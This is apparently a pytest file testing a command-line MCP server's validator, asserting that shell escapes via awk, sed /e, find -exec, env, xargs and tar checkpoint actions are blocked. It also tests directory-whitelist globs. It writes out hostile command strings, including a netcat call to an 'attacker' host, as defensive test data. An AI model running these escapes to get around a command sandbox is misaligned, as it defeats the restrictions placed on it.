"""Tests for specific security vulnerabilities.

Each test group corresponds to a vulnerability category identified in the
security analysis. Tests are written before the fix so they initially FAIL,
then pass once the fix is applied.
"""

import pytest
from cmd_line_mcp.config import Config
from cmd_line_mcp.security import validate_command, is_directory_whitelisted


@pytest.fixture
def default_cmd_lists():
    """Return command lists from the real default configuration."""
    config = Config()
    return config.get_effective_command_lists()


def _blocked(cmd_lists, command):
    """Assert a command is blocked (is_valid == False)."""
    result = validate_command(
        command,
        cmd_lists["read"],
        cmd_lists["write"],
        cmd_lists["system"],
        cmd_lists["blocked"],
        cmd_lists["dangerous_patterns"],
    )
    assert result["is_valid"] is False, (
        f"Expected '{command}' to be blocked, but it was allowed "
        f"(type={result['command_type']})"
    )


# ---------------------------------------------------------------------------
# V1 — awk sub-execution via system() and getline
# ---------------------------------------------------------------------------


def test_awk_system_call(default_cmd_lists):
    """awk system() must be blocked."""
    _blocked(default_cmd_lists, "awk 'BEGIN {system(\"id\")}'")


def test_awk_system_call_nc(default_cmd_lists):
    """awk system() calling a blocked command must be blocked."""
    _blocked(default_cmd_lists, "awk 'BEGIN {system(\"nc\")}'")


def test_awk_system_with_spaces(default_cmd_lists):
    """awk system() with spaces around parens must be blocked."""
    _blocked(default_cmd_lists, "awk 'BEGIN { system (\"id\") }'")


def test_awk_pipe_to_getline(default_cmd_lists):
    """awk pipe-to-getline execution must be blocked."""
    _blocked(default_cmd_lists, 'awk \'BEGIN { while (("id" | getline l) > 0) print l }\'')


def test_awk_print_pipe(default_cmd_lists):
    """awk print-pipe-to-command must be blocked."""
    _blocked(default_cmd_lists, "cat /tmp/file | awk '{print | \"id\"}'")


# ---------------------------------------------------------------------------
# V2 — sed /e execution flag
# ---------------------------------------------------------------------------


def test_sed_e_flag_basic(default_cmd_lists):
    """sed substitution with /e flag must be blocked."""
    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/e'")


def test_sed_e_flag_with_command(default_cmd_lists):
    """sed /e flag embedding a command must be blocked."""
    _blocked(default_cmd_lists, "sed 's/.*/id/e' /tmp/file")


def test_sed_e_flag_malicious(default_cmd_lists):
    """sed /e flag with network command must be blocked."""
    _blocked(default_cmd_lists, "echo x | sed 's/x/nc attacker 4444/e'")


def test_sed_ge_flags(default_cmd_lists):
    """sed /ge flags (global + exec) must be blocked."""
    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/ge'")


def test_sed_eg_flags(default_cmd_lists):
    """sed /eg flags must be blocked."""
    _blocked(default_cmd_lists, "echo id | sed 's/.*/&/eg'")


# ---------------------------------------------------------------------------
# V3 — find -exec with shell interpreters
# Use the + terminator (not \;) so the test relies on the -exec pattern,
# not the accidental semicolon-split path.
# ---------------------------------------------------------------------------


def test_find_exec_sh(default_cmd_lists):
    """find -exec sh must be blocked."""
    _blocked(default_cmd_lists, "find /tmp -exec sh -c 'id' {} +")


def test_find_exec_bash(default_cmd_lists):
    """find -exec bash must be blocked."""
    _blocked(default_cmd_lists, "find /tmp -exec bash -c 'id' {} +")


def test_find_exec_python3(default_cmd_lists):
    """find -exec python3 must be blocked."""
    _blocked(
        default_cmd_lists,
        "find /tmp -maxdepth 0 -exec python3 -c '__import__(\"os\").system(\"id\")' {} +",
    )


def test_find_exec_perl(default_cmd_lists):
    """find -exec perl must be blocked."""
    _blocked(default_cmd_lists, "find /tmp -exec perl -e 'system(\"id\")' {} +")


def test_find_exec_env(default_cmd_lists):
    """find -exec env (to proxy into sh) must be blocked."""
    _blocked(default_cmd_lists, "find /tmp -exec env sh {} +")


# ---------------------------------------------------------------------------
# V4 — env executing arbitrary binaries
# ---------------------------------------------------------------------------


def test_env_exec_bash(default_cmd_lists):
    """env bash must be blocked."""
    _blocked(default_cmd_lists, "env bash")


def test_env_exec_sh(default_cmd_lists):
    """env sh must be blocked."""
    _blocked(default_cmd_lists, "env sh -c id")


def test_env_exec_python(default_cmd_lists):
    """env python3 must be blocked."""
    _blocked(default_cmd_lists, "env python3 -c '__import__(\"os\").system(\"id\")'")


# ---------------------------------------------------------------------------
# V5 — xargs passing blocked/arbitrary commands
# ---------------------------------------------------------------------------


def test_xargs_sh(default_cmd_lists):
    """xargs sh must be blocked."""
    _blocked(default_cmd_lists, "echo id | xargs sh -c")


def test_xargs_bash(default_cmd_lists):
    """xargs bash must be blocked."""
    _blocked(default_cmd_lists, "ls /tmp | xargs bash -c 'id'")


def test_xargs_python(default_cmd_lists):
    """xargs python3 must be blocked."""
    _blocked(
        default_cmd_lists,
        "echo x | xargs python3 -c '__import__(\"os\").system(\"id\")'",
    )


def test_xargs_env(default_cmd_lists):
    """xargs env (to proxy into a shell) must be blocked."""
    _blocked(default_cmd_lists, "echo bash | xargs env")


# ---------------------------------------------------------------------------
# V6 — tar --checkpoint-action and --to-command
# ---------------------------------------------------------------------------


def test_tar_checkpoint_action(default_cmd_lists):
    """tar --checkpoint-action=exec must be blocked."""
    _blocked(
        default_cmd_lists,
        "tar -cf /tmp/x.tar --checkpoint=1 --checkpoint-action=exec=id /tmp",
    )


def test_tar_to_command(default_cmd_lists):
    """tar --to-command must be blocked."""
    _blocked(default_cmd_lists, "tar -cf /tmp/a.tar --to-command=cat /tmp")


def test_tar_checkpoint_action_sh(default_cmd_lists):
    """tar --checkpoint-action=exec=sh must be blocked."""
    _blocked(default_cmd_lists, "tar --checkpoint-action=exec=sh /tmp")


# ---------------------------------------------------------------------------
# V9 — Glob-to-regex conversion bugs in whitelist check
# ---------------------------------------------------------------------------


def test_glob_whitelist_does_not_match_extended_prefix():
    """/tmp/* in whitelist must NOT match /tmp.evil.com/subdir."""
    whitelisted = ["/tmp/*"]
    assert not is_directory_whitelisted("/tmp.evil.com/subdir", whitelisted), (
        "/tmp/* should not match /tmp.evil.com/subdir"
    )


def test_glob_whitelist_matches_subdir():
    """/tmp/* in whitelist MUST match /tmp/subdir."""
    whitelisted = ["/tmp/*"]
    assert is_directory_whitelisted("/tmp/subdir", whitelisted), (
        "/tmp/* should match /tmp/subdir"
    )


def test_glob_whitelist_dot_in_path_not_wildcard():
    """A whitelist entry with a literal dot must not match any character."""
    # /home/user/proj.docs should only match exactly that path, not projXdocs
    whitelisted = ["/home/user/proj.docs/*"]
    assert not is_directory_whitelisted("/home/user/projXdocs/sub", whitelisted), (
        "Dot in whitelist path must be treated as literal, not regex wildcard"
    )


def test_glob_whitelist_exact_dot_path_matches():
    """A whitelist entry with a literal dot must match the correct path."""
    whitelisted = ["/home/user/proj.docs/*"]
    assert is_directory_whitelisted("/home/user/proj.docs/sub", whitelisted), (
        "/home/user/proj.docs/* should match /home/user/proj.docs/sub"
    )


def test_glob_whitelist_no_partial_match():
    """/tmp/* must not match /tmpfiles/x — no partial prefix match."""
    whitelisted = ["/tmp/*"]
    assert not is_directory_whitelisted("/tmpfiles/x", whitelisted), (
        "/tmp/* should not match /tmpfiles/x"
    )
